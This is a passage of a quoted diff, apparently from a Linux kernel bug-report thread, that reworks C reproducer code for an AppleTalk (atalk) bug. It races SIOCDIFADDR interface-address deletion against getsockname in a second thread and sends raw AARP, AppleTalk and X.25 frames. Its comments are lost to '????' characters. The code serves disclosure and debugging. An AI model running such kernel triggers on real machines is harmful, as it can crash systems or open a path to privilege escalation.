->   struct sockaddr_at ssa = {0};
+>   struct ifreq atreq;
+>   strcpy(atreq.ifr_ifrn.ifrn_name, "lo");
 > 
->   ssa.sat_addr.s_node = 0;
->   ssa.sat_addr.s_net = 0;
->   ssa.sat_family = PF_APPLETALK;
+>   struct sockaddr_at * sa = (struct sockaddr_at *)&atreq.ifr_addr;
 > 
->   char buf[200];
->   recvfrom(xxx_raw_fd, buf, 200, 0, (void *)&addr, sizeof(addr));
+>   sa->sat_family = AF_APPLETALK;
+>   struct atalk_netrange * nr = (struct atalk_netrange *)&sa->sat_zero[0];
+>   nr->nr_phase = 2;
+>   sa->sat_addr.s_node = 3;
+>   sa->sat_addr.s_net = 12;
+> 
+>   ioctl(at_fd, SIOCDIFADDR, &atreq);
 > }
 > 
 > void use_thread() {
 >   pincpu(1);
->   uint64_t x;
->   usleep(15000);
->   ioctl(xxx_raw_fd, TIOCINQ, &x);
->   puts("use done");
+>   struct sockaddr addr = {0};
+>   getsockname(at_fd, &addr, sizeof(struct sockaddr));
 > }
 > 
-> #include <linux/atalk.h>
-> #include <stdio.h>
-> #include <stdlib.h>
-> #include <string.h>
-> #include <sys/socket.h>
-> #include <sys/types.h>
-> struct aarp_packet {
->   uint16_t hardware_type;             /* ???? */
->   uint16_t protocol_type;             /* ???? */
->   uint8_t hardware_length;            /* ?????? */
->   uint8_t protocol_length;            /* ?????? */
->   uint16_t operation;                 /* ???? */
->   uint8_t sender_hardware_address[6]; /* ??????? */
->   uint8_t sender_protocol_address[4]; /* ??????? */
->   uint8_t target_hardware_address[6]; /* ?????? */
->   uint8_t target_protocol_address[4]; /* ?????? */
-> };
-> 
-> int send3() {
->   /* ????? */
->   int sockfd = socket(AF_APPLETALK, SOCK_DGRAM, 0);
->   if (sockfd < 0) {
->     perror("socket error");
->     exit(EXIT_FAILURE);
->   }
-> 
->   /* ????????????? */
->   struct sockaddr_at sa;
->   memset(&sa, 0, sizeof(sa));
->   sa.sat_family = AF_APPLETALK;
->   sa.sat_port = htons(0);
->   sa.sat_addr.s_net = 0x0000;
->   sa.sat_addr.s_node = 0x0000;
->   if (bind(sockfd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
->     perror("bind error");
->     exit(EXIT_FAILURE);
->   }
-> 
->   /* ?? AARP_REQUEST ?? */
->   struct aarp_packet packet;
->   memset(&packet, 0, sizeof(packet));
->   packet.hardware_type = htons(0);
->   packet.protocol_type = htons(1);
->   packet.hardware_length = 2;
->   packet.protocol_length = 3;
->   packet.operation = htons(4);
->   packet.sender_hardware_address[0] = 0x11;
->   packet.sender_hardware_address[1] = 0x22;
->   packet.sender_hardware_address[2] = 0x33;
->   packet.sender_hardware_address[3] = 0x44;
->   packet.sender_hardware_address[4] = 0x55;
->   packet.sender_hardware_address[5] = 0x66;
->   packet.sender_protocol_address[0] = 192;
->   packet.sender_protocol_address[1] = 168;
->   packet.sender_protocol_address[2] = 1;
->   packet.sender_protocol_address[3] = 1;
->   packet.target_hardware_address[0] = 0x00;
->   packet.target_hardware_address[1] = 0x00;
->   packet.target_hardware_address[2] = 0x00;
->   packet.target_hardware_address[3] = 0x00;
->   packet.target_hardware_address[4] = 0x00;
->   packet.target_hardware_address[5] = 0x00;
->   packet.target_protocol_address[0] = 192;
->   packet.target_protocol_address[1] = 168;
->   packet.target_protocol_address[2] = 1;
->   packet.target_protocol_address[3] = 2;
-> 
->   /* ?? AARP_REQUEST ?? */
->   struct sockaddr_at dest;
->   memset(&dest, 0, sizeof(dest));
->   dest.sat_family = AF_APPLETALK;
->   dest.sat_port = htons(0);
->   dest.sat_addr.s_net = htons(0x20);
->   dest.sat_addr.s_node = 0x0000;
->   if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&dest,
->              sizeof(dest)) < 0) {
->     perror("sendto error");
->     exit(EXIT_FAILURE);
->   }
-> 
->   /* ????? */
->   close(sockfd);
-> 
->   return 0;
-> }
+> #define ETH_P_X25 0x0805
 > 
 > int send_pkt2() {
-> 
 >   int sockfd;
 >   struct sockaddr_ll sa;
 >   struct ether_header eth_header;
@@ -580,8 +445,7 @@ PS: there are 6 reports for atalk in this series.
 >   char *interface = "lo"; // Replace with your desired interface name
 > 
 >   // Create socket
->   sockfd = socket(PF_APPLETALK, SOCK_RAW, htons(ETH_P_ATALK));
->   xxx_raw_fd = sockfd;
+>   sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_PPPTALK));
 >   if (sockfd == -1) {
 >     perror("socket");
 >     return 1;
@@ -589,16 +453,9 @@ PS: there are 6 reports for atalk in this series.
 > 
 >   // Set interface index
 >   memset(&sa, 0, sizeof(struct sockaddr_ll));
->   sa.sll_family = PF_APPLETALK;
->   sa.sll_protocol = htons(ETH_P_ATALK);
+>   sa.sll_family = AF_PACKET;
+>   sa.sll_protocol = htons(ETH_P_PPPTALK);
 >   sa.sll_ifindex = if_nametoindex(interface);
-> 
->   struct sockaddr_at ssa = {0};
-> 
->   ssa.sat_addr.s_node = 0;
->   ssa.sat_addr.s_net = htons(0x20);
->   ssa.sat_family = PF_APPLETALK;
->   ssa.sat_port = 0x80;
 > 
 >   // Set Ethernet header
 >   memset(&eth_header, 0, sizeof(struct ether_header));
@@ -614,7 +471,7 @@ PS: there are 6 reports for atalk in this series.
 >   eth_header.ether_dhost[3] = 0x99;
 >   eth_header.ether_dhost[4] = 0xAA;
 >   eth_header.ether_dhost[5] = 0xBB;
->   eth_header.ether_type = htons(ETH_P_ATALK);
+>   eth_header.ether_type = htons(ETH_P_X25);
 > 
 >   // Set IP header
 >   memset(&ip_header, 0x22, sizeof(struct iphdr));
@@ -627,67 +484,87 @@ PS: there are 6 reports for atalk in this series.
 > 
 >   // Send the packet
 >   if (sendto(sockfd, packet, sizeof(struct ether_header) + 4, 0,
->              (struct sockaddr *)&ssa, sizeof(struct sockaddr_ll)) == -1) {
+>              (struct sockaddr *)&sa, sizeof(struct sockaddr_ll)) == -1) {
 >     perror("sendto");
 >     return 1;
 >   }
 > 
 >   printf("Packet sent successfully.\n");
+> 
+>   // Close the socket
+>   close(sockfd);
+> 
+>   return 0;
+> }
+> 
+> #define ETH_P_X25 0x0805
+> 
+> int send_pkt() {
+>   // ???????
+>   int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_X25));
+>   if (sockfd == -1) {
+>     perror("Socket creation failed");
+>     exit(EXIT_FAILURE);
+>   }
+> 
+>   // ??socket????
+>   struct sockaddr_ll sa;
+>   memset(&sa, 0, sizeof(struct sockaddr_ll));
+>   sa.sll_family = AF_PACKET;
+>   sa.sll_protocol = htons(ETH_P_X25);
+> 
+>   // ??????
+>   sa.sll_ifindex = if_nametoindex("eth0");
+>   if (sa.sll_ifindex == 0) {
+>     perror("Interface not found");
+>     close(sockfd);
+>     exit(EXIT_FAILURE);
+>   }
+> 
+>   // ??X.25???
+>   char packet[] = {0x00, 0x00, 0x00, 0x00, // X.25?
+>                    // ??X.25?????
+>                    0x11, 0x22, 0x33};
+> 
+>   // ?????
+>   if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&sa,
+>              sizeof(struct sockaddr_ll)) == -1) {
+>     perror("Packet sending failed");
+>     close(sockfd);
+>     exit(EXIT_FAILURE);
+>   }
+> 
+>   printf("Packet sent successfully\n");
+> 
+>   // ?????
+>   close(sockfd);
+> 
 >   return 0;
 > }
 > 
 > int main() {
->   struct ifreq atreq = {0};
+> 
 > 
 >   at_fd = socket(PF_APPLETALK, SOCK_DGRAM, 0);
 >   printf("fd: %d\n", at_fd);
 > 
+>   del();
+> 
+>   struct ifreq atreq;
 >   strcpy(atreq.ifr_ifrn.ifrn_name, "lo");
 > 
->   struct sockaddr_at *sa = (struct sockaddr_at *)&atreq.ifr_addr;
+>   struct sockaddr_at * sa = (struct sockaddr_at *)&atreq.ifr_addr;
 > 
 >   sa->sat_family = AF_APPLETALK;
->   struct atalk_netrange *nr = (struct atalk_netrange *)&sa->sat_zero[0];
+>   struct atalk_netrange * nr = (struct atalk_netrange *)&sa->sat_zero[0];
 >   nr->nr_phase = 2;
 >   sa->sat_addr.s_node = 3;
 >   sa->sat_addr.s_net = 12;
-> 
->   ioctl(at_fd, SIOCDIFADDR, &atreq);
-> 
->   sa = (struct sockaddr_at *)&atreq.ifr_addr;
-> 
->   sa->sat_family = AF_APPLETALK;
->   nr = (struct atalk_netrange *)&sa->sat_zero[0];
->   nr->nr_phase = 2;
->   sa->sat_addr.s_node = 3;
->   sa->sat_addr.s_net = 12;
-> 
->   nr->nr_lastnet = htons(0x21);
->   nr->nr_firstnet = htons(0x20);
 > 
 >   ioctl(at_fd, SIOCSIFADDR, &atreq);
 > 
->   struct rtentry rt = {0};
->   char name[] = "lo";
->   rt.rt_dev = name;
 > 
->   struct sockaddr_at *ta = (struct sockaddr_at *)&rt.rt_dst;
->   struct sockaddr_at *ga = (struct sockaddr_at *)&rt.rt_gateway;
->   ta->sat_family = AF_APPLETALK;
->   ga->sat_family = AF_APPLETALK;
->   ta->sat_addr.s_net = 0x33;
->   ta->sat_addr.s_node = 0x32;
->   // ioctl(at_fd, SIOCADDRT, &rt);
 > 
->   struct sockaddr_at addr = {0};
->   addr.sat_family = AF_APPLETALK;    // ?????
->   addr.sat_addr.s_net = htons(0x20); // ????
->   addr.sat_addr.s_node = 0;
->   addr.sat_port = 0;
->   int bind_res = bind(at_fd, (struct sockaddr *)&addr, sizeof(addr));
-> 
->   puts("22222");
->   send_pkt2();
 > 
 >   pthread_barrier_init(&barrier, NULL, THREAD_NUMS);
 > 
@@ -697,8 +574,6 @@ PS: there are 6 reports for atalk in this series.
 > 
 >   pthread_join(ids[0], NULL);
 >   pthread_join(ids[1], NULL);
-> 
->   sleep(1);
 > }
 > 
 > 
